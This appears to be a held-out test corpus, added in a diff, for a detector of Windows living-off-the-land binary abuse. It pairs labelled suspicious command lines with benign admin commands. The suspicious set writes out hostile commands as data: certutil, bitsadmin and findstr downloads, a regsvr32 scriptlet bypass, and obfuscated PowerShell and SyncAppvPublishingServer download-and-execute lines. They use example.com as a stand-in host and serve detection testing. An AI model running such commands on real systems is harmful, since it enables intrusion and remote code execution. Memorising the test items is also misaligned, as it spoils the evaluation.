@@ -1,0 +1,37 @@
+{
+  "_note": "Held-out set: written before the engine and NEVER used to tune rules. Its results are reported separately and as measured. Same conventions as corpus.json (example.com only, illustrative, no working payloads). The owner may replace or extend this with an independent corpus.",
+  "suspicious": [
+    { "id": "h-1", "cmd": "certutil.exe -urlcache -f https://example.com/update.zip %APPDATA%\\update.zip", "expect": { "binary": "certutil.exe", "category": "Download" } },
+    { "id": "h-2", "cmd": "bitsadmin.exe /create job1 & bitsadmin /addfile job1 http://example.com/t.exe C:\\ProgramData\\t.exe & bitsadmin /resume job1", "expect": { "binary": "bitsadmin.exe", "category": "Download" } },
+    { "id": "h-3", "cmd": "REGSVR32.EXE /u /n /s /i:https://example.com/c.sct scrobj.dll", "expect": { "binary": "regsvr32.exe", "category": "AWL Bypass" } },
+    { "id": "h-4", "cmd": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('calc');close()\"", "expect": { "binary": "mshta.exe", "category": "Execute" } },
+    { "id": "h-5", "cmd": "rundll32 url.dll,FileProtocolHandler C:\\ProgramData\\run.exe", "expect": { "binary": "url.dll", "category": "Execute" } },
+    { "id": "h-6", "cmd": "wmic /node:192.0.2.10 process call create \"cmd /c whoami > C:\\temp\\o.txt\"", "expect": { "binary": "wmic.exe", "category": "Execute" } },
+    { "id": "h-7", "cmd": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:C:\\ProgramData\\x.exe C:\\ProgramData\\x.cs", "expect": { "binary": "csc.exe", "category": "Compile" } },
+    { "id": "h-8", "cmd": "msiexec.exe /quiet /i \\\\example.com\\share\\setup.msi", "expect": { "binary": "msiexec.exe", "category": "Execute" } },
+    { "id": "h-9", "cmd": "findstr /V /L W3AllLov3LolBas \\\\example.com\\share\\file.exe > C:\\ProgramData\\file.exe", "expect": { "binary": "findstr.exe", "category": "Download" } },
+    { "id": "h-10", "cmd": "powershell -w 1 -ep bypass -e {{psenc:$c=New-Object System.Net.WebClient;$c.DownloadFile('http://example.com/a.exe','C:\\ProgramData\\a.exe')}}", "expect": { "heuristic": true } },
+    { "id": "h-11", "cmd": "p^o^w^e^r^s^h^e^l^l -c \"iwr http://example.com/b.ps1 -UseBasicParsing | iex\"", "expect": { "heuristic": true } },
+    { "id": "h-12", "cmd": "cscript //E:jscript C:\\Users\\Public\\readme.txt", "expect": { "binary": "cscript.exe", "category": "ADS" } },
+    { "id": "h-13", "cmd": "control.exe C:\\Users\\Public\\item.cpl", "expect": { "binary": "control.exe", "category": "Execute" } },
+    { "id": "h-14", "cmd": "pcalua.exe -a C:\\Users\\Public\\app.exe", "expect": { "binary": "pcalua.exe", "category": "Execute" } },
+    { "id": "h-15", "cmd": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('http://example.com/c.ps1') | IEX\"", "expect": { "binary": "syncappvpublishingserver.exe", "category": "Execute" } }
+  ],
+  "benign": [
+    { "id": "hb-1", "cmd": "certutil -verify C:\\Certs\\server.cer" },
+    { "id": "hb-2", "cmd": "powershell.exe -ExecutionPolicy RemoteSigned -File \\\\fileserver\\scripts\\logon.ps1" },
+    { "id": "hb-3", "cmd": "rundll32.exe user32.dll,LockWorkStation" },
+    { "id": "hb-4", "cmd": "schtasks /run /tn \"Microsoft\\Windows\\Defrag\\ScheduledDefrag\"" },
+    { "id": "hb-5", "cmd": "wmic product where \"name like 'Contoso%'\" get name,version" },
+    { "id": "hb-6", "cmd": "msiexec /i \\\\fileserver\\packages\\office.msi /qb TRANSFORMS=custom.mst" },
+    { "id": "hb-7", "cmd": "bitsadmin /info myjob /verbose" },
+    { "id": "hb-8", "cmd": "reg export HKCU\\Software\\Contoso C:\\Backup\\contoso.reg" },
+    { "id": "hb-9", "cmd": "cscript.exe C:\\Windows\\System32\\slmgr.vbs /dli" },
+    { "id": "hb-10", "cmd": "regsvr32 /s C:\\Program Files\\Contoso\\shellext.dll" },
+    { "id": "hb-11", "cmd": "mstsc.exe /v:terminal01.corp.example.com" },
+    { "id": "hb-12", "cmd": "net user alice /domain" },
+    { "id": "hb-13", "cmd": "wusa.exe C:\\Updates\\windows10.0-kb5000000-x64.msu /quiet /norestart" },
+    { "id": "hb-14", "cmd": "taskkill /im notepad.exe /f" },
+    { "id": "hb-15", "cmd": "cmd /c \"C:\\Program Files\\Contoso\\bin\\update.bat\" --silent" }
+  ]
+}
